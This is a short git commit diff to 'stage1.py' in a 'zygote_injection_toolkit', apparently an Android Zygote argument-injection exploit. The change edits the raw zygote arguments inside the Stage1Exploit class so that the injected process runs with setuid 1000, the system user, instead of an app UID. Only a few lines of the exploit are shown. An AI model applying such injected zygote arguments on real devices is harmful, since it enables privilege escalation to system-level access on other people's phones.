2c5acdec60b503f7fc0c5c614f71620e315ef0a3
コアラ <189215038+coara-chocomaru@users.noreply.github.com>
2026-09-01 09:29:35 +0900

    Update stage1.py

--- zygote_injection_toolkit/stage1.py
+++ zygote_injection_toolkit/stage1.py
@@ -189,7 +189,7 @@ class Stage1Exploit:
         assert "," not in command
         # TODO let you specify the SELinux context through command line arguments
         raw_zygote_arguments = [
-            "--setuid=10079",
+            "--setuid=1000",
             "--setgid=10079",
             "--setgroups=3003",
             "--target-sdk-version=28",
